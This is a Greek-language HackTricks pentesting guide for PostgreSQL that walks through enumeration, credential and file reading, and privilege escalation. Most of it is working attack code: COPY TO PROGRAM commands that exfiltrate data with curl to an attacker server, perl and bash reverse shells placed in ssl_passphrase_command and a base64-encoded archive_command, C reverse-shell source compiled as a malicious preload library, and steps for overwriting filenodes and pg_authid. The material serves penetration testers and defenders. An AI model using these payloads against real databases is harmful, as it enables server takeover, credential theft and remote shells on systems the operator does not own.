# 5432,5433 - Pentesting Postgresql


{{#include ../banners/hacktricks-training.md}}

## **Βασικές Πληροφορίες**

**PostgreSQL** περιγράφεται ως ένα **σύστημα αντικειμενοστραφούς βάσης δεδομένων** που είναι **ανοιχτού κώδικα**. Αυτό το σύστημα όχι μόνο χρησιμοποιεί τη γλώσσα SQL αλλά την ενισχύει επίσης με επιπλέον χαρακτηριστικά. Οι δυνατότητές του του επιτρέπουν να διαχειρίζεται ένα ευρύ φάσμα τύπων δεδομένων και λειτουργιών, καθιστώντας το μια ευέλικτη επιλογή για προγραμματιστές και οργανισμούς.

**Προεπιλεγμένη θύρα:** 5432, και αν αυτή η θύρα είναι ήδη σε χρήση φαίνεται ότι το postgresql θα χρησιμοποιήσει την επόμενη θύρα (πιθανώς 5433) που δεν είναι σε χρήση.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Σύνδεση & Βασική Καταμέτρηση
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Αν εκτελώντας **`\list`** βρείτε μια βάση δεδομένων που ονομάζεται **`rdsadmin`** ξέρετε ότι βρίσκεστε μέσα σε μια **AWS postgresql database**.

Για περισσότερες πληροφορίες σχετικά με **το πώς να εκμεταλλευτείτε μια βάση δεδομένων PostgreSQL** ελέγξτε:

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Αυτόματη Αρίθμηση
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Σάρωση θύρας**

Σύμφωνα με [**αυτή την έρευνα**](https://www.exploit-db.com/papers/13084), όταν μια απόπειρα σύνδεσης αποτύχει, το `dblink` ρίχνει μια εξαίρεση `sqlclient_unable_to_establish_sqlconnection` που περιλαμβάνει μια εξήγηση του σφάλματος. Παραδείγματα αυτών των λεπτομερειών παρατίθενται παρακάτω.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Ο διακομιστής είναι εκτός λειτουργίας

`DETAIL: δεν ήταν δυνατή η σύνδεση με τον διακομιστή: Δεν υπάρχει διαδρομή προς τον διακομιστή. Είναι ο διακομιστής σε λειτουργία στον υπολογιστή "1.2.3.4" και δέχεται συνδέσεις TCP/IP στην θύρα 5678;`

- Η θύρα είναι κλειστή
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Η θύρα είναι ανοιχτή
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ή
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Η θύρα είναι ανοιχτή ή φιλτραρισμένη
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Στις συναρτήσεις PL/pgSQL, αυτή τη στιγμή δεν είναι δυνατή η απόκτηση λεπτομερειών εξαιρέσεων. Ωστόσο, αν έχετε άμεση πρόσβαση στον διακομιστή PostgreSQL, μπορείτε να ανακτήσετε τις απαραίτητες πληροφορίες. Αν η εξαγωγή ονομάτων χρηστών και κωδικών πρόσβασης από τους πίνακες συστήματος δεν είναι εφικτή, μπορείτε να εξετάσετε τη μέθοδο επίθεσης wordlist που συζητήθηκε στην προηγούμενη ενότητα, καθώς θα μπορούσε να αποφέρει θετικά αποτελέσματα.

## Αριθμητική Δικαιωμάτων

### Ρόλοι

| Τύποι Ρόλων   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Ο ρόλος έχει δικαιώματα superuser                                                                                                                  |
| rolinherit     | Ο ρόλος κληρονομεί αυτόματα τα δικαιώματα των ρόλων των οποίων είναι μέλος                                                                          |
| rolcreaterole  | Ο ρόλος μπορεί να δημιουργήσει περισσότερους ρόλους                                                                                                 |
| rolcreatedb    | Ο ρόλος μπορεί να δημιουργήσει βάσεις δεδομένων                                                                                                      |
| rolcanlogin    | Ο ρόλος μπορεί να συνδεθεί. Δηλαδή, αυτός ο ρόλος μπορεί να δοθεί ως ο αρχικός αναγνωριστικός δείκτης εξουσιοδότησης της συνεδρίας                  |
| rolreplication | Ο ρόλος είναι ρόλος αναπαραγωγής. Ένας ρόλος αναπαραγωγής μπορεί να ξεκινήσει συνδέσεις αναπαραγωγής και να δημιουργήσει και να διαγράψει θέσεις αναπαραγωγής. |
| rolconnlimit   | Για ρόλους που μπορούν να συνδεθούν, αυτό ορίζει τον μέγιστο αριθμό ταυτόχρονων συνδέσεων που μπορεί να κάνει αυτός ο ρόλος. -1 σημαίνει χωρίς όριο.   |
| rolpassword    | Όχι ο κωδικός πρόσβασης (διαβάζεται πάντα ως `********`)                                                                                              |
| rolvaliduntil  | Χρόνος λήξης κωδικού πρόσβασης (χρησιμοποιείται μόνο για την αυθεντικοποίηση κωδικού πρόσβασης); null αν δεν υπάρχει λήξη                             |
| rolbypassrls   | Ο ρόλος παρακάμπτει κάθε πολιτική ασφαλείας σε επίπεδο γραμμής, δείτε [Ενότητα 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) για περισσότερες πληροφορίες. |
| rolconfig      | Προεπιλεγμένες ρυθμίσεις συγκεκριμένες για τον ρόλο για μεταβλητές ρύθμισης χρόνου εκτέλεσης                                                          |
| oid            | ID του ρόλου                                                                                                                                       |

#### Ενδιαφέροντα Γκρουπ

- Αν είστε μέλος του **`pg_execute_server_program`** μπορείτε να **εκτελείτε** προγράμματα
- Αν είστε μέλος του **`pg_read_server_files`** μπορείτε να **διαβάζετε** αρχεία
- Αν είστε μέλος του **`pg_write_server_files`** μπορείτε να **γράφετε** αρχεία

> [!NOTE]
> Σημειώστε ότι στο Postgres ένας **χρήστης**, μια **ομάδα** και ένας **ρόλος** είναι το **ίδιο**. Εξαρτάται απλώς από **το πώς το χρησιμοποιείτε** και αν **επιτρέπετε να συνδεθεί**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Πίνακες
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Συναρτήσεις
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Δράσεις συστήματος αρχείων

### Ανάγνωση καταλόγων και αρχείων

Από αυτήν την [**δέσμευση**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) τα μέλη της καθορισμένης **`DEFAULT_ROLE_READ_SERVER_FILES`** ομάδας (που ονομάζεται **`pg_read_server_files`**) και οι **super users** μπορούν να χρησιμοποιούν τη μέθοδο **`COPY`** σε οποιαδήποτε διαδρομή (ελέγξτε το `convert_and_check_filename` στο `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Θυμηθείτε ότι αν δεν είστε υπερχρήστης αλλά έχετε τα δικαιώματα **CREATEROLE** μπορείτε να **γίνετε μέλος αυτής της ομάδας:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**Περισσότερες πληροφορίες.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Υπάρχουν **άλλες συναρτήσεις postgres** που μπορούν να χρησιμοποιηθούν για **να διαβάσουν ένα αρχείο ή να καταγράψουν έναν κατάλογο**. Μόνο **υπερχρήστες** και **χρήστες με ρητές άδειες** μπορούν να τις χρησιμοποιήσουν:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Μπορείτε να βρείτε **περισσότερες συναρτήσεις** στο [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Απλή Γραφή Αρχείου

Μόνο **super users** και μέλη του **`pg_write_server_files`** μπορούν να χρησιμοποιήσουν το copy για να γράψουν αρχεία.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Θυμηθείτε ότι αν δεν είστε super user αλλά έχετε τα δικαιώματα **`CREATEROLE`** μπορείτε **να γίνετε μέλος αυτής της ομάδας:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Περισσότερες πληροφορίες.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Θυμηθείτε ότι το COPY δεν μπορεί να χειριστεί χαρακτήρες νέας γραμμής, επομένως ακόμη και αν χρησιμοποιείτε ένα payload base64 **πρέπει να στείλετε μια ενιαία γραμμή**.\
Μια πολύ σημαντική περιοριστική παράμετρος αυτής της τεχνικής είναι ότι **`copy` δεν μπορεί να χρησιμοποιηθεί για να γράψει δυαδικά αρχεία καθώς τροποποιεί κάποιες δυαδικές τιμές.**

### **Ανέβασμα δυαδικών αρχείων**

Ωστόσο, υπάρχουν **άλλες τεχνικές για να ανεβάσετε μεγάλα δυαδικά αρχεία:**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Ενημέρωση δεδομένων πίνακα PostgreSQL μέσω εγγραφής τοπικού αρχείου

Αν έχετε τα απαραίτητα δικαιώματα για να διαβάσετε και να γράψετε αρχεία του διακομιστή PostgreSQL, μπορείτε να ενημερώσετε οποιονδήποτε πίνακα στον διακομιστή **επικαλύπτοντας τον σχετικό κόμβο αρχείου** στον [κατάλογο δεδομένων PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Περισσότερα για αυτή την τεχνική** [**εδώ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Απαιτούμενα βήματα:

1.  Αποκτήστε τον κατάλογο δεδομένων PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Σημείωση:** Αν δεν μπορείτε να ανακτήσετε την τρέχουσα διαδρομή του καταλόγου δεδομένων από τις ρυθμίσεις, μπορείτε να ερωτήσετε την κύρια έκδοση PostgreSQL μέσω του ερωτήματος `SELECT version()` και να προσπαθήσετε να βρείτε τη διαδρομή με brute-force. Κοινές διαδρομές καταλόγου δεδομένων σε εγκαταστάσεις Unix του PostgreSQL είναι `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Ένα κοινό όνομα κλάσσης είναι `main`.

2.  Αποκτήστε μια σχετική διαδρομή προς τον κόμβο αρχείου, που σχετίζεται με τον στόχο πίνακα

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Αυτή η ερώτηση θα πρέπει να επιστρέψει κάτι σαν `base/3/1337`. Η πλήρης διαδρομή στον δίσκο θα είναι `$DATA_DIRECTORY/base/3/1337`, δηλαδή `/var/lib/postgresql/13/main/base/3/1337`.

3.  Κατεβάστε τον κόμβο αρχείου μέσω των συναρτήσεων `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Αποκτήστε τον τύπο δεδομένων, που σχετίζεται με τον στόχο πίνακα

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Χρησιμοποιήστε τον [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) για να [επεξεργαστείτε τον κόμβο αρχείου](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); ρυθμίστε όλες τις boolean σημαίες `rol*` σε 1 για πλήρη δικαιώματα.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![Demo του PostgreSQL Filenode Editor](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Επαναφορτώστε τον επεξεργασμένο κόμβο αρχείου μέσω των συναρτήσεων `lo_*`, και επικαλύψτε το αρχικό αρχείο στον δίσκο

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Προαιρετικά)_ Καθαρίστε την κρυφή μνήμη του πίνακα που βρίσκεται στη μνήμη εκτελώντας ένα ακριβό SQL ερώτημα

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Τώρα θα πρέπει να δείτε ενημερωμένες τιμές πίνακα στο PostgreSQL.

Μπορείτε επίσης να γίνετε superadmin επεξεργαζόμενοι τον πίνακα `pg_authid`. **Δείτε** [**την επόμενη ενότητα**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE σε πρόγραμμα**

Από την[ έκδοση 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), μόνο οι **super users** και τα μέλη της ομάδας **`pg_execute_server_program`** μπορούν να χρησιμοποιούν το copy για RCE (παράδειγμα με εξαγωγή:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Παράδειγμα για εκτέλεση:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Θυμηθείτε ότι αν δεν είστε υπερ-χρήστης αλλά έχετε τα δικαιώματα **`CREATEROLE`** μπορείτε να **γίνετε μέλος αυτής της ομάδας:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Περισσότερες πληροφορίες.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ή χρησιμοποιήστε το module `multi/postgres/postgres_copy_from_program_cmd_exec` από το **metasploit**.\
Περισσότερες πληροφορίες σχετικά με αυτή την ευπάθεια [**εδώ**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Ενώ αναφέρθηκε ως CVE-2019-9193, το Postges δήλωσε ότι αυτό ήταν [χαρακτηριστικό και δεν θα διορθωθεί](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE με PostgreSQL Γλώσσες

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE με επεκτάσεις PostgreSQL

Αφού έχετε **μάθει** από την προηγούμενη ανάρτηση **πώς να ανεβάσετε δυαδικά αρχεία** μπορείτε να προσπαθήσετε να αποκτήσετε **RCE ανεβάζοντας μια επέκταση postgresql και φορτώνοντάς την**.

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE με το αρχείο ρυθμίσεων PostgreSQL

> [!NOTE]
> Οι παρακάτω RCE διανύσματα είναι ιδιαίτερα χρήσιμα σε περιορισμένα SQLi συμφραζόμενα, καθώς όλα τα βήματα μπορούν να εκτελούνται μέσω εσωτερικών δηλώσεων SELECT

Το **αρχείο ρυθμίσεων** του PostgreSQL είναι **γραμμένο** από τον **χρήστη postgres**, ο οποίος είναι αυτός που εκτελεί τη βάση δεδομένων, οπότε ως **υπερ-χρήστης**, μπορείτε να γράψετε αρχεία στο σύστημα αρχείων, και επομένως μπορείτε να **επικαλύψετε αυτό το αρχείο.**

![](<../images/image (322).png>)

#### **RCE με ssl_passphrase_command**

Περισσότερες πληροφορίες [σχετικά με αυτή την τεχνική εδώ](https://pulsesecurity.co.nz/articles/postgres-sqli).

Το αρχείο ρυθμίσεων έχει μερικά ενδιαφέροντα χαρακτηριστικά που μπορούν να οδηγήσουν σε RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Διαδρομή προς το ιδιωτικό κλειδί της βάσης δεδομένων
- `ssl_passphrase_command = ''` Αν το ιδιωτικό αρχείο είναι προστατευμένο με κωδικό (κρυπτογραφημένο) το postgresql θα **εκτελέσει την εντολή που υποδεικνύεται σε αυτό το χαρακτηριστικό**.
- `ssl_passphrase_command_supports_reload = off` **Αν** αυτό το χαρακτηριστικό είναι **ενεργό** η **εντολή** που εκτελείται αν το κλειδί είναι προστατευμένο με κωδικό **θα εκτελείται** όταν εκτελείται το `pg_reload_conf()`.

Έτσι, ένας επιτιθέμενος θα χρειαστεί να:

1. **Εξάγει το ιδιωτικό κλειδί** από τον διακομιστή
2. **Κρυπτογραφήσει** το κατεβασμένο ιδιωτικό κλειδί:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Επικαλύψει**
4. **Εξάγει** την τρέχουσα **ρύθμιση** του postgresql
5. **Επικαλύψει** την **ρύθμιση** με την αναφερόμενη ρύθμιση χαρακτηριστικών:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Εκτελέστε `pg_reload_conf()`

Κατά τη διάρκεια της δοκιμής αυτού παρατήρησα ότι αυτό θα λειτουργήσει μόνο αν το **ιδιωτικό αρχείο κλειδιού έχει δικαιώματα 640**, είναι **κατοχυρωμένο από τον root** και από την **ομάδα ssl-cert ή postgres** (έτσι ώστε ο χρήστης postgres να μπορεί να το διαβάσει), και είναι τοποθετημένο στο _/var/lib/postgresql/12/main_.

#### **RCE με archive_command**

**Περισσότερες** [**πληροφορίες σχετικά με αυτή τη ρύθμιση και για το WAL εδώ**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Ένα άλλο χαρακτηριστικό στο αρχείο ρυθμίσεων που είναι εκμεταλλεύσιμο είναι το `archive_command`.

Για να λειτουργήσει αυτό, η ρύθμιση `archive_mode` πρέπει να είναι `'on'` ή `'always'`. Αν αυτό είναι αληθές, τότε θα μπορούσαμε να επικαλύψουμε την εντολή στο `archive_command` και να την αναγκάσουμε να εκτελείται μέσω των λειτουργιών WAL (write-ahead logging).

Τα γενικά βήματα είναι:

1. Ελέγξτε αν η λειτουργία αρχείου είναι ενεργοποιημένη: `SELECT current_setting('archive_mode')`
2. Επικαλύψτε το `archive_command` με το payload. Για παράδειγμα, μια αντίστροφη θήκη: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Επαναφορτώστε τη ρύθμιση: `SELECT pg_reload_conf()`
4. Αναγκάστε τη λειτουργία WAL να εκτελείται, η οποία θα καλέσει την εντολή αρχείου: `SELECT pg_switch_wal()` ή `SELECT pg_switch_xlog()` για ορισμένες εκδόσεις Postgres

#### **RCE με βιβλιοθήκες προφόρτωσης**

Περισσότερες πληροφορίες [σχετικά με αυτή την τεχνική εδώ](https://adeadfed.com/posts/postgresql-select-only-rce/).

Αυτή η επιθετική διαδρομή εκμεταλλεύεται τις παρακάτω ρυθμιστικές μεταβλητές:

- `session_preload_libraries` -- βιβλιοθήκες που θα φορτωθούν από τον διακομιστή PostgreSQL κατά τη σύνδεση του πελάτη.
- `dynamic_library_path` -- λίστα καταλόγων όπου ο διακομιστής PostgreSQL θα αναζητήσει τις βιβλιοθήκες.

Μπορούμε να ορίσουμε την τιμή `dynamic_library_path` σε έναν κατάλογο, που είναι εγγράψιμος από τον χρήστη `postgres` που εκτελεί τη βάση δεδομένων, π.χ., κατάλογο `/tmp/`, και να ανεβάσουμε ένα κακόβουλο αντικείμενο `.so` εκεί. Στη συνέχεια, θα αναγκάσουμε τον διακομιστή PostgreSQL να φορτώσει τη νέα μας βιβλιοθήκη συμπεριλαμβάνοντάς την στη μεταβλητή `session_preload_libraries`.

Τα βήματα της επίθεσης είναι:

1. Κατεβάστε το αρχικό `postgresql.conf`
2. Συμπεριλάβετε τον κατάλογο `/tmp/` στην τιμή `dynamic_library_path`, π.χ. `dynamic_library_path = '/tmp:$libdir'`
3. Συμπεριλάβετε το όνομα της κακόβουλης βιβλιοθήκης στην τιμή `session_preload_libraries`, π.χ. `session_preload_libraries = 'payload.so'`
4. Ελέγξτε την κύρια έκδοση PostgreSQL μέσω του ερωτήματος `SELECT version()`
5. Συγκεντρώστε τον κωδικό της κακόβουλης βιβλιοθήκης με το σωστό πακέτο ανάπτυξης PostgreSQL Δείγμα κώδικα:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Συγκεντρώνοντας τον κώδικα:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Ανεβάστε το κακόβουλο `postgresql.conf`, που δημιουργήθηκε στα βήματα 2-3, και επικαλύψτε το αρχικό
7. Ανεβάστε το `payload.so` από το βήμα 5 στον κατάλογο `/tmp`
8. Επαναφορτώστε τη ρύθμιση του διακομιστή επανεκκινώντας τον διακομιστή ή καλώντας το ερώτημα `SELECT pg_reload_conf()`
9. Στην επόμενη σύνδεση DB, θα λάβετε τη σύνδεση αντίστροφης θήκης.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Σύμφωνα με τα [**έγγραφα**](https://www.postgresql.org/docs/13/sql-grant.html): _Οι ρόλοι που έχουν δικαίωμα **`CREATEROLE`** μπορούν να **παραχωρήσουν ή να ανακαλέσουν την ιδιότητα μέλους σε οποιονδήποτε ρόλο** που **δεν είναι** υπερ-χρήστης._

Έτσι, αν έχετε δικαίωμα **`CREATEROLE`** μπορείτε να παραχωρήσετε πρόσβαση σε άλλους **ρόλους** (που δεν είναι υπερ-χρήστης) που μπορούν να σας δώσουν την επιλογή να διαβάσετε & γράψετε αρχεία και να εκτελέσετε εντολές:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Τροποποίηση Κωδικού

Οι χρήστες με αυτόν τον ρόλο μπορούν επίσης να **αλλάξουν** τους **κωδικούς** άλλων **μη υπερχρηστών**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Είναι αρκετά συνηθισμένο να διαπιστώνει κανείς ότι **οι τοπικοί χρήστες μπορούν να συνδεθούν στο PostgreSQL χωρίς να παρέχουν κανέναν κωδικό πρόσβασης**. Επομένως, μόλις έχετε συγκεντρώσει **δικαιώματα για να εκτελέσετε κώδικα** μπορείτε να εκμεταλλευτείτε αυτά τα δικαιώματα για να σας παραχωρηθεί ο ρόλος **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!NOTE]
> Αυτό είναι συνήθως δυνατό λόγω των παρακάτω γραμμών στο αρχείο **`pg_hba.conf`**:
>
> ```bash
> # "local" είναι μόνο για συνδέσεις Unix domain socket
> local   all             all                                     trust
> # Τοπικές συνδέσεις IPv4:
> host    all             all             127.0.0.1/32            trust
> # Τοπικές συνδέσεις IPv6:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

Στο [**αυτό το άρθρο**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) εξηγείται πώς ήταν δυνατό να γίνει **privesc** στο Postgres GCP εκμεταλλευόμενοι το δικαίωμα ALTER TABLE που είχε παραχωρηθεί στον χρήστη.

Όταν προσπαθείτε να **κάνετε έναν άλλο χρήστη ιδιοκτήτη ενός πίνακα**, θα πρέπει να λάβετε ένα **σφάλμα** που να το αποτρέπει, αλλά προφανώς το GCP έδωσε αυτή την **επιλογή στον χρήστη postgres που δεν είναι superuser** στο GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Συνδυάζοντας αυτή την ιδέα με το γεγονός ότι όταν εκτελούνται οι εντολές **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) σε έναν **πίνακα με μια συνάρτηση ευρετηρίου**, η **συνάρτηση** καλείται ως μέρος της εντολής με τα δικαιώματα του **ιδιοκτήτη** του **πίνακα**. Είναι δυνατό να δημιουργηθεί ένα ευρετήριο με μια συνάρτηση και να παραχωρηθούν δικαιώματα ιδιοκτησίας σε έναν **super user** πάνω σε αυτόν τον πίνακα, και στη συνέχεια να εκτελεστεί ANALYZE πάνω στον πίνακα με τη κακόβουλη συνάρτηση που θα είναι σε θέση να εκτελεί εντολές επειδή χρησιμοποιεί τα προνόμια του ιδιοκτήτη.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Εκμετάλλευση

1. Ξεκινήστε δημιουργώντας έναν νέο πίνακα.
2. Εισάγετε κάποια άσχετα περιεχόμενα στον πίνακα για να παρέχετε δεδομένα για τη λειτουργία ευρετηρίου.
3. Αναπτύξτε μια κακόβουλη λειτουργία ευρετηρίου που περιέχει ένα payload εκτέλεσης κώδικα, επιτρέποντας την εκτέλεση μη εξουσιοδοτημένων εντολών.
